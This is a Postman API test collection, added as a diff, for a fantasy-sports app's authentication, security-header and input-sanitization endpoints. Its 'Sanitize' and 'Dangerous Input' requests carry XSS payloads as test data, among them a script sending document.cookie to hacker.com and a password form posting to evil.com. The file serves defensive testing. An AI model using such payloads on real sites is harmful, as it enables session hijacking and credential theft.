@@ -1,0 +1,1157 @@
+{
+	"info": {
+		"_postman_id": "556bcea9-bdde-49cc-a67a-0dc08f7f2bce",
+		"name": "App Fantasy Coach",
+		"description": "Comprehensive API tests for App Fantasy Coach - Authentication, Security, Health, and Info endpoints",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "30324564"
+	},
+	"item": [
+		{
+			"name": "Authentication",
+			"item": [
+				{
+					"name": "🔐 User Registration",
+					"item": [
+						{
+							"name": "POST Register User",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 201\", function () {",
+											"    pm.response.to.have.status(201);",
+											"});",
+											"pm.test(\"Registration successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"    pm.expect(jsonData.data).to.have.property('user');",
+											"});",
+											"pm.test(\"User data sanitized\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData.data.user).to.not.have.property('password');",
+											"    pm.expect(jsonData.data.user).to.not.have.property('refreshToken');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"firstname\": \"Test\",\n  \"lastname\": \"User\",\n  \"email\": \"{{test_email}}\",\n  \"password\": \"{{test_password}}\",\n  \"confirmPassword\": \"{{test_password}}\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/api/auth/register",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"auth",
+										"register"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST Verify Email",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Email verification successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"    pm.expect(jsonData.data.user).to.have.property('isVerified', true);",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"code\": \"{{verification_code}}\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/api/auth/verify-email",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"auth",
+										"verify-email"
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "🔑 Session Management",
+					"item": [
+						{
+							"name": "POST Login User",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Login successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"    pm.expect(jsonData.data).to.have.property('accessToken');",
+											"    pm.expect(jsonData.data).to.have.property('user');",
+											"});",
+											"pm.test(\"Refresh token cookie set\", function () {",
+											"    var refreshTokenCookie = pm.cookies.get('refreshToken');",
+											"    pm.expect(refreshTokenCookie).to.not.be.null;",
+											"});",
+											"// Store tokens for future requests",
+											"if (pm.response.code === 200) {",
+											"    var jsonData = pm.response.json();",
+											"    pm.collectionVariables.set('access_token', jsonData.data.accessToken);",
+											"    pm.collectionVariables.set('user_id', jsonData.data.user.id);",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{test_email}}\",\n  \"password\": \"{{test_password}}\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/login",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST Logout User",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Logout successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"});",
+											"pm.test(\"Refresh token cookie cleared\", function () {",
+											"    var refreshTokenCookie = pm.cookies.get('refreshToken');",
+											"    pm.expect(refreshTokenCookie).to.be.undefined;",
+											"});",
+											"// Clear stored tokens",
+											"pm.collectionVariables.unset('access_token');",
+											"pm.collectionVariables.unset('user_id');"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{access_token}}"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/logout",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"logout"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "GET Refresh Token",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Token refresh successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"    pm.expect(jsonData.data).to.have.property('accessToken');",
+											"});",
+											"// Update stored access token",
+											"if (pm.response.code === 200) {",
+											"    var jsonData = pm.response.json();",
+											"    pm.collectionVariables.set('access_token', jsonData.data.accessToken);",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/refresh",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"refresh"
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "🔒 Password Management",
+					"item": [
+						{
+							"name": "POST Forgot Password",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Password reset initiated\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"});"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{test_email}}\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/forgot-password",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"forgot-password"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "POST Reset Password",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Password reset successful\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('success', true);",
+											"});"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"password\": \"{{new_password}}\",\n  \"confirmPassword\": \"{{new_password}}\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/reset-password?token={{reset_token}}",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"reset-password"
+									],
+									"query": [
+										{
+											"key": "token",
+											"value": "{{reset_token}}"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "📊 Auth Health & Security",
+					"item": [
+						{
+							"name": "GET Check Auth Status",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Authentication status returned\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('authenticated');",
+											"    pm.expect(jsonData).to.have.property('user');",
+											"});"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{access_token}}"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/api/{{api_version}}/auth/check-auth",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"{{api_version}}",
+										"auth",
+										"check-auth"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "GET Security Headers Validation",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Security headers present\", function () {",
+											"    pm.expect(pm.response.headers.get('X-Frame-Options')).to.eql('DENY');",
+											"    pm.expect(pm.response.headers.get('X-Content-Type-Options')).to.eql('nosniff');",
+											"    pm.expect(pm.response.headers.get('X-Powered-By')).to.be.undefined;",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/api/auth/security-headers",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"api",
+										"auth",
+										"security-headers"
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				}
+			],
+			"description": "User authentication and session management endpoints"
+		},
+		{
+			"name": "Security & Test Endpoints",
+			"item": [
+				{
+					"name": "Test Error Handling",
+					"item": [
+						{
+							"name": "Generic Error",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 500\", function () {",
+											"    pm.response.to.have.status(500);",
+											"});",
+											"pm.test(\"Error message present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('message');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/error",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"error"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Validation Error",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 400\", function () {",
+											"    pm.response.to.have.status(400);",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/error/validation",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"error",
+										"validation"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Database Error",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 503\", function () {",
+											"    pm.response.to.have.status(503);",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/error/database",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"error",
+										"database"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Authentication Error",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 401\", function () {",
+											"    pm.response.to.have.status(401);",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/error/authentication",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"error",
+										"authentication"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Not Found (404) Route Test",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 500\", function () {",
+											"    pm.response.to.have.status(500);",
+											"});",
+											"pm.test(\"Error message present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('message');",
+											"});"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/nonexistent/path",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"nonexistent",
+										"path"
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Sanitize Middleware",
+					"item": [
+						{
+							"name": "Sanitize GET",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Response contains sanitized data\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('receivedData');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/sanitize?name=John<script>alert('xss')</script>&search=<img src=x onerror=stealData()>&comment=Hello<div onclick=malicious()>World</div>",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"sanitize"
+									],
+									"query": [
+										{
+											"key": "name",
+											"value": "John<script>alert('xss')</script>"
+										},
+										{
+											"key": "search",
+											"value": "<img src=x onerror=stealData()>"
+										},
+										{
+											"key": "comment",
+											"value": "Hello<div onclick=malicious()>World</div>"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Sanitize POST",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Response structure is valid\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('receivedData');",
+											"    pm.expect(jsonData).to.have.property('sanitizationStats');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"username\": \"user123<script>alert('hacked')</script>\",\n  \"email\": \"test@example.com\",\n  \"bio\": \"I love <iframe src=\\\"evil.com\\\"></iframe> and <script>console.log('malicious')</script>\",\n  \"htmlContent\": \"<div style=\\\"background: url(javascript:alert(1))\\\">Dangerous</div>\",\n  \"link\": \"<a href=\\\"javascript:alert('xss')\\\">Click me</a>\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/test/sanitize",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"sanitize"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Sanitize GET by ID",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Response contains sanitized data\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('receivedData');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/sanitize/123?test=<script>alert('id')</script>",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"sanitize",
+										"123"
+									],
+									"query": [
+										{
+											"key": "test",
+											"value": "<script>alert('id')</script>"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Dangerous Input Test",
+					"item": [
+						{
+							"name": "Dangerous Input POST",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Security status present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('securityStatus');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"xssPayload\": \"<script>document.location='http://hacker.com/?c='+document.cookie</script>\",\n  \"htmlInjection\": \"<form action=\\\"http://evil.com\\\" method=\\\"post\\\"><input name=\\\"password\\\" type=\\\"password\\\"></form>\",\n  \"eventHandlers\": \"<img src=\\\"x\\\" onerror=\\\"fetch('/api/user/data')\\\">\",\n  \"javascriptUrl\": \"<a href=\\\"javascript:void(0)\\\" onclick=\\\"stealInfo()\\\">Safe Link</a>\",\n  \"iframeAttack\": \"<iframe src=\\\"http://phishing-site.com\\\" width=\\\"100%\\\" height=\\\"500\\\"></iframe>\"\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/test/dangerous-input",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"dangerous-input"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Dangerous Input GET",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Security status present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('securityStatus');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/dangerous-input?xss=<script>alert('get')</script>",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"dangerous-input"
+									],
+									"query": [
+										{
+											"key": "xss",
+											"value": "<script>alert('get')</script>"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Comprehensive Security Test",
+					"item": [
+						{
+							"name": "Comprehensive Security POST",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Both helmet and sanitize data present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('helmet');",
+											"    pm.expect(jsonData).to.have.property('sanitize');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json"
+									},
+									{
+										"key": "X-API-Key",
+										"value": "test-key-123"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"safeField\": \"This is normal text\",\n  \"maliciousField\": \"<script>alert('This should be sanitized')</script>\",\n  \"mixedContent\": \"Hello <b>bold</b> and <script>bad()</script> world\",\n  \"nestedObject\": {\n    \"clean\": \"Normal value\",\n    \"dirty\": \"<img src=x onerror=maliciousCode()>\",\n    \"array\": [\"safe\", \"<iframe src=evil.com>\", \"normal\"]\n  }\n}"
+								},
+								"url": {
+									"raw": "{{base_url}}/test/security?queryParam=normal&xssParam=<script>alert('query')</script>",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"security"
+									],
+									"query": [
+										{
+											"key": "queryParam",
+											"value": "normal"
+										},
+										{
+											"key": "xssParam",
+											"value": "<script>alert('query')</script>"
+										}
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Comprehensive Security GET",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Both helmet and sanitize data present\", function () {",
+											"    var jsonData = pm.response.json();",
+											"    pm.expect(jsonData).to.have.property('helmet');",
+											"    pm.expect(jsonData).to.have.property('sanitize');",
+											"});"
+										],
+										"type": "text/javascript"
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/test/security?queryParam=normal&xssParam=<script>alert('query')</script>",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"test",
+										"security"
+									],
+									"query": [
+										{
+											"key": "queryParam",
+											"value": "normal"
+										},
+										{
+											"key": "xssParam",
+											"value": "<script>alert('query')</script>"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					]
+				},
+				{
+					"name": "Health Check",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 200\", function () {",
+									"    pm.response.to.have.status(200);",
+									"});",
+									"pm.test(\"Response has status field\", function () {",
+									"    pm.response.to.have.jsonBody('status');",
+									"});"
+								],
+								"type": "text/javascript",
+								"packages": {},
+								"requests": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/test/health",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"test",
+								"health"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Helmet Security Headers",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 200\", function () {",
+									"    pm.response.to.have.status(200);",
+									"});",
+									"pm.test(\"Helmet headers are present\", function () {",
+									"    pm.expect(pm.response.headers.get('X-Frame-Options')).to.eql('DENY');",
+									"    pm.expect(pm.response.headers.get('X-Content-Type-Options')).to.eql('nosniff');",
+									"    pm.expect(pm.response.headers.get('X-Powered-By')).to.be.undefined;",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/test/helmet",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"test",
+								"helmet"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Security Statistics",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test(\"Status code is 200\", function () {",
+									"    pm.response.to.have.status(200);",
+									"});",
+									"pm.test(\"Stats data present\", function () {",
+									"    var jsonData = pm.response.json();",
+									"    pm.expect(jsonData).to.have.property('sanitization');",
+									"});"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/test/stats",
+							"host": [
+								"{{base_url}}"
+							],
+							"path": [
+								"test",
+								"stats"
+							]
+						}
+					},
+					"response": []
+				}
+			],
+			"description": "All /test and /health endpoints for security and diagnostics"
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					"// Pre-request script for authentication flow",
+					"console.log('Testing authentication endpoints for: ' + pm.collectionVariables.get('base_url'));"
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					"// Global test assertions",
+					"pm.test(\"Response time is acceptable\", function () {",
+					"    pm.expect(pm.response.responseTime).to.be.below(3000);",
+					"});"
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "base_url",
+			"value": "http://localhost:4000",
+			"type": "string"
+		},
+		{
+			"key": "test_email",
+			"value": "test@example.com",
+			"type": "string"
+		},
+		{
+			"key": "test_password",
+			"value": "SecurePass123!",
+			"type": "string"
+		},
+		{
+			"key": "new_password",
+			"value": "NewSecurePass123!",
+			"type": "string"
+		},
+		{
+			"key": "reset_token",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "verification_code",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
